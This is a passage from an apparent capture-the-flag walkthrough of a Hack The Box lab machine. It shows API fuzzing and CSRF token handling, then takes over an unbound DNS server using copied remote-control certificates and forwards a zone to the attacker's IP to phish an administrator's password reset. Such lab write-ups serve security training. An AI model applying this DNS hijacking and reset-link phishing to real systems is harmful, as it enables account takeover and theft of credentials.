<li>response = {&ldquo;success&rdquo;:&ldquo;false&rdquo;,&ldquo;token&rdquo;:&ldquo;cgK0B69G-LcsBvp-BDuMikgZdHEd4rkh-I2E&rdquo;} containssome token</li>
</ul>
</li>
<li>POST /api/login
<ul>
<li>but it protected against CSRF: <code>X-CSRF-Token: cgK0B69G-LcsBvp-BDuMikgZdHEd4rkh-I2E</code></li>
<li>We find the token previosly generated by GET /auth/api</li>
</ul>
</li>
<li>GET /js/app~748942c6.ead68abe.js that we beautify on <a href="https://beautifier.io/">https://beautifier.io/</a> instead of jsnice.org</li>
</ul>
<p>while the http signup is disabled, maybe there is an active API to signup ?</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">curl -s crossfit-club.htb/js/app~748942c6.ead68abe.js | grep -oE <span style="color:#f1fa8c">&#39;/api/[^&#34;]*&#39;</span> | sort -u
/api/auth
/api/gridy/<span style="color:#f1fa8c">${</span><span style="color:#8be9fd;font-style:italic">e</span>[t].username<span style="color:#f1fa8c">}</span>.svg<span style="color:#f1fa8c">`</span>,new:!1,unreadCount:0,roomName:e<span style="color:#ff79c6">[</span>t<span style="color:#ff79c6">]</span>.username,users:<span style="color:#ff79c6">[]}</span>;a.users.push<span style="color:#ff79c6">(</span>this.getCurrentUser<span style="color:#ff79c6">())</span>,a.users.push<span style="color:#ff79c6">(</span>e<span style="color:#ff79c6">[</span>t<span style="color:#ff79c6">])</span>,this.rooms.push<span style="color:#ff79c6">(</span>a<span style="color:#ff79c6">)}}</span>,sendGlobal:function<span style="color:#ff79c6">(</span>e,t<span style="color:#ff79c6">){</span>const <span style="color:#8be9fd;font-style:italic">a</span><span style="color:#ff79c6">={</span>sender_id:xe.id,content:e,roomId:t<span style="color:#ff79c6">}</span>;xe.emit<span style="color:#ff79c6">(</span>
/api/gridy/<span style="color:#f1fa8c">${</span><span style="color:#8be9fd;font-style:italic">name</span><span style="color:#f1fa8c">}</span>.svg<span style="color:#f1fa8c">`</span>,items:<span style="color:#ff79c6">[{</span>title:
/api/login
</code></pre></td></tr></table>
</div>
</div><p>There is none, but we can try to FUZZ for more api endpoints</p>
<h2 id="api-fuzzing">API fuzzing</h2>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">wfuzz -u http://crossfit-club.htb/api/FUZZ -w /opt/SecLists/Discovery/Web-Content/api/objects.txt -t <span style="color:#bd93f9">30</span> --hc <span style="color:#bd93f9">404</span>
000000169:   <span style="color:#bd93f9">200</span>        <span style="color:#bd93f9">0</span> L      <span style="color:#bd93f9">1</span> W      <span style="color:#bd93f9">66</span> Ch       <span style="color:#f1fa8c">&#34;auth&#34;</span>
000001338:   <span style="color:#bd93f9">200</span>        <span style="color:#bd93f9">0</span> L      <span style="color:#bd93f9">3</span> W      <span style="color:#bd93f9">71</span> Ch       <span style="color:#f1fa8c">&#34;ping&#34;</span>
wfuzz -X POST -u http://crossfit-club.htb/api/FUZZ -w /opt/SecLists/Discovery/Web-Content/api/objects.txt -t <span style="color:#bd93f9">30</span> --hc <span style="color:#bd93f9">404</span>
000001070:   <span style="color:#bd93f9">200</span>        <span style="color:#bd93f9">0</span> L      <span style="color:#bd93f9">3</span> W      <span style="color:#bd93f9">50</span> Ch       <span style="color:#f1fa8c">&#34;login&#34;</span>
000001632:   <span style="color:#bd93f9">200</span>        <span style="color:#bd93f9">0</span> L      <span style="color:#bd93f9">3</span> W      <span style="color:#bd93f9">50</span> Ch       <span style="color:#f1fa8c">&#34;signup&#34;</span>
</code></pre></td></tr></table>
</div>
</div><p>We have to manage csrf</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">curl -s crossfit-club.htb/api/ping

&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt;&lt;div <span style="color:#8be9fd;font-style:italic">id</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;status&#39;</span>&gt;offline&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;

curl -s crossfit-club.htb/api/ping
<span style="color:#ff79c6">{</span><span style="color:#f1fa8c">&#34;success&#34;</span>:<span style="color:#f1fa8c">&#34;false&#34;</span>,<span style="color:#f1fa8c">&#34;message&#34;</span>:<span style="color:#f1fa8c">&#34;Invalid CSRF Token&#34;</span><span style="color:#ff79c6">}</span>
</code></pre></td></tr></table>
</div>
</div><p>signup accepts <code>X-CSRF-TOKEN</code> header:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">curl -v -X OPTIONS crossfit-club.htb/api/signup
&gt; OPTIONS /api/signup HTTP/1.1
&gt; Host: crossfit-club.htb
&gt; User-Agent: curl/7.64.1
&gt; Accept: */*
&gt;
&lt; HTTP/1.1 <span style="color:#bd93f9">204</span> No Content
&lt; Access-Control-Allow-Credentials: <span style="color:#8be9fd;font-style:italic">true</span>
&lt; Access-Control-Allow-Headers: X-CSRF-TOKEN,Content-Type
&lt; Access-Control-Allow-Methods: GET,HEAD,PUT,PATCH,POST,DELETE
&lt; Connection: close
&lt; Content-Length: <span style="color:#bd93f9">0</span>
&lt; Date: Sun, <span style="color:#bd93f9">05</span> Sep <span style="color:#bd93f9">2021</span> 20:28:03 GMT
&lt; Vary: Origin
&lt; X-Powered-By: Express
</code></pre></td></tr></table>
</div>
</div><p>we save the cookie in a file, and the token in an environment variable</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">curl -s crossfit-club.htb/api/auth
<span style="color:#ff79c6">{</span><span style="color:#f1fa8c">&#34;success&#34;</span>:<span style="color:#f1fa8c">&#34;false&#34;</span>,<span style="color:#f1fa8c">&#34;token&#34;</span>:<span style="color:#f1fa8c">&#34;roTVvk0X-uLy97ICL6w-VXQDU9tC7_FKLyBU&#34;</span><span style="color:#ff79c6">}</span>
<span style="color:#8be9fd;font-style:italic">TOKEN</span><span style="color:#ff79c6">=</span><span style="color:#ff79c6">$(</span>curl -c /tmp/c -s http://crossfit-club.htb/api/auth | jq -r <span style="color:#f1fa8c">&#39;.token&#39;</span><span style="color:#ff79c6">)</span>;
</code></pre></td></tr></table>
</div>
</div><p>Now we can attempt to call signup.</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">curl -s -b /tmp/c -X POST crossfit-club.htb/api/signup
<span style="color:#ff79c6">{</span><span style="color:#f1fa8c">&#34;success&#34;</span>:<span style="color:#f1fa8c">&#34;false&#34;</span>,<span style="color:#f1fa8c">&#34;message&#34;</span>:<span style="color:#f1fa8c">&#34;Only administrators can register accounts.&#34;</span><span style="color:#ff79c6">}</span>
</code></pre></td></tr></table>
</div>
</div><ul>
<li>we learn only admin can register new accounts but we don&rsquo;t have an admin cookie so that won&rsquo;t work :(</li>
<li>we won&rsquo;t know for sure what are the fields for this /api/signup but we can make it a guess from the <code>&lt;form&gt;</code> input fields: username, email, password and confirm</li>
</ul>
<p>Therefore the solution could be to phish an administrator by sending him a password reset link that will point to us, instead.
We can use unbound-control to tell we are the server for that zone</p>
<h2 id="explore-unbound-on-port-8953">Explore unbound on port 8953</h2>
<h3 id="attempt-to-remote-control-unbound">attempt to remote-control unbound</h3>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">sudo apt install unbound
unbound-control -s 10.10.10.232 stats
<span style="color:#ff79c6">[</span>1630849332<span style="color:#ff79c6">]</span> unbound-control<span style="color:#ff79c6">[</span>48237:0<span style="color:#ff79c6">]</span> warning: control-enable is <span style="color:#f1fa8c">&#39;no&#39;</span> in the config file.
</code></pre></td></tr></table>
</div>
</div><p>Reading the unbound.conf from /etc/unbound fails because we are in OpenBSD and as per its manpage <a href="https://man.openbsd.org/unbound.conf">https://man.openbsd.org/unbound.conf</a> , the configuration files should be in /var/unbound/ instead.</p>
<h3 id="varunboundetcunboundconf">/var/unbound/etc/unbound.conf</h3>
<p>The name resolution will only works from 127.0.0.1</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-yml" data-lang="yml"><span style="color:#ff79c6">server</span>:
        <span style="color:#ff79c6">interface</span>: <span style="color:#bd93f9">127.0.0.1</span>
        <span style="color:#ff79c6">interface</span>: ::<span style="color:#bd93f9">1</span>
        <span style="color:#ff79c6">access-control</span>: <span style="color:#bd93f9">0.0.0.0</span>/0 refuse
        <span style="color:#ff79c6">access-control</span>: <span style="color:#bd93f9">127.0.0.0</span>/8 allow
        <span style="color:#ff79c6">access-control</span>: ::<span style="color:#bd93f9">0</span>/0 refuse
        <span style="color:#ff79c6">access-control</span>: ::<span style="color:#bd93f9">1</span> allow
	[..]
</code></pre></td></tr></table>
</div>
</div><p>However, the unbound-control command will work whatever the interface and authentication is using certs. I simply have to copy those certs to my attacker machine.</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-yml" data-lang="yml"><span style="color:#ff79c6">remote-control</span>:
  <span style="color:#ff79c6">control-enable</span>: <span style="color:#ff79c6">yes</span>
  <span style="color:#ff79c6">control-interface</span>: <span style="color:#bd93f9">0.0.0.0</span>
  <span style="color:#ff79c6">control-use-cert</span>: <span style="color:#ff79c6">yes</span>
  <span style="color:#ff79c6">server-key-file</span>: <span style="color:#f1fa8c">&#34;/var/unbound/etc/tls/unbound_server.key&#34;</span>
  <span style="color:#ff79c6">server-cert-file</span>: <span style="color:#f1fa8c">&#34;/var/unbound/etc/tls/unbound_server.pem&#34;</span>
  <span style="color:#ff79c6">control-key-file</span>: <span style="color:#f1fa8c">&#34;/var/unbound/etc/tls/unbound_control.key&#34;</span>
  <span style="color:#ff79c6">control-cert-file</span>: <span style="color:#f1fa8c">&#34;/var/unbound/etc/tls/unbound_control.pem&#34;</span>
</code></pre></td></tr></table>
</div>
</div><p>I can now fetch keys and certificates, and replace locally in my /etc/unbound folder; then I craft a small ./unbound.conf:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-yml" data-lang="yml"><span style="color:#ff79c6">remote-control</span>:
  <span style="color:#ff79c6">control-enable</span>: <span style="color:#ff79c6">yes</span>
  <span style="color:#ff79c6">control-interface</span>: <span style="color:#bd93f9">0.0.0.0</span>
  <span style="color:#ff79c6">control-use-cert</span>: <span style="color:#ff79c6">yes</span>
  <span style="color:#ff79c6">server-key-file</span>: <span style="color:#f1fa8c">&#34;/etc/unbound/unbound_server.key&#34;</span>
  <span style="color:#ff79c6">server-cert-file</span>: <span style="color:#f1fa8c">&#34;/etc/unbound/unbound_server.pem&#34;</span>
  <span style="color:#ff79c6">control-key-file</span>: <span style="color:#f1fa8c">&#34;/etc/unbound/unbound_control.key&#34;</span>
  <span style="color:#ff79c6">control-cert-file</span>: <span style="color:#f1fa8c">&#34;/etc/unbound/unbound_control.pem&#34;</span>
</code></pre></td></tr></table>
</div>
</div><p>Once the configuration written, I can successfully remote-control unbound</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">unbound-control -s 10.10.10.232 -c ./unbound.conf status
version: 1.11.0
verbosity: <span style="color:#bd93f9">1</span>
threads: <span style="color:#bd93f9">1</span>
modules: <span style="color:#bd93f9">2</span> <span style="color:#ff79c6">[</span> validator iterator <span style="color:#ff79c6">]</span>
uptime: <span style="color:#bd93f9">18</span> seconds
options: control<span style="color:#ff79c6">(</span>ssl<span style="color:#ff79c6">)</span>
unbound <span style="color:#ff79c6">(</span>pid 48014<span style="color:#ff79c6">)</span> is running...
</code></pre></td></tr></table>
</div>
</div><h3 id="change-dns-records">Change DNS records</h3>
<p>No command works except forward_add</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">unbound-control -s 10.10.10.232 -c ./unbound.conf forward_add +i XXXemployees.crossfit.htb 10.10.14.112@53
ok
</code></pre></td></tr></table>
</div>
</div><h3 id="test-dsn-forward">Test DSN forward</h3>
<p>To test if it works, we can start tcpdump listening on UDP port 53 and send a POST request with header <code>Host: XXXemployees.crossfit.htb</code>.</p>
<p>We use repeater to modify the Host header:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-http" data-lang="http"><span style="color:#50fa7b">POST</span> /password-reset.php <span style="color:#ff79c6">HTTP</span><span style="color:#ff79c6">/</span><span style="color:#bd93f9">1.1</span>
Host<span style="color:#ff79c6">:</span> XXXemployees.crossfit.htb
User-Agent<span style="color:#ff79c6">:</span> Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:91.0) Gecko/20100101 Firefox/91.0
Accept<span style="color:#ff79c6">:</span> text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language<span style="color:#ff79c6">:</span> en-GB,en;q=0.5
Accept-Encoding<span style="color:#ff79c6">:</span> gzip, deflate
Content-Type<span style="color:#ff79c6">:</span> application/x-www-form-urlencoded
Content-Length<span style="color:#ff79c6">:</span> 33
Origin<span style="color:#ff79c6">:</span> http://employees.crossfit.htb
DNT<span style="color:#ff79c6">:</span> 1
Connection<span style="color:#ff79c6">:</span> close
Referer<span style="color:#ff79c6">:</span> http://employees.crossfit.htb/password-reset.php
Upgrade-Insecure-Requests<span style="color:#ff79c6">:</span> 1

email=david.palmer%40crossfit.htb
</code></pre></td></tr></table>
</div>
</div><p>We can see the DNS query, so the DNS forward is successful</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">sudo tcpdump -ni utun1 udp port <span style="color:#bd93f9">53</span>
05:03:52.535229 IP 10.10.10.232.44059 &gt; 10.10.14.112.53: 21507+ <span style="color:#ff79c6">[</span>1au<span style="color:#ff79c6">]</span> A? XXXemployees.crossfit.htb. <span style="color:#ff79c6">(</span>54<span style="color:#ff79c6">)</span>
</code></pre></td></tr></table>
</div>
</div><p>However, we have a new error message: <code>Only local hosts are allowed.</code>. Therefore, we have to run a <a href="https://github.com/Crypt0s/FakeDns">FakeDNS</a> server that will resolve XXXemployees.crossfit.htb as 127.0.0.1</p>
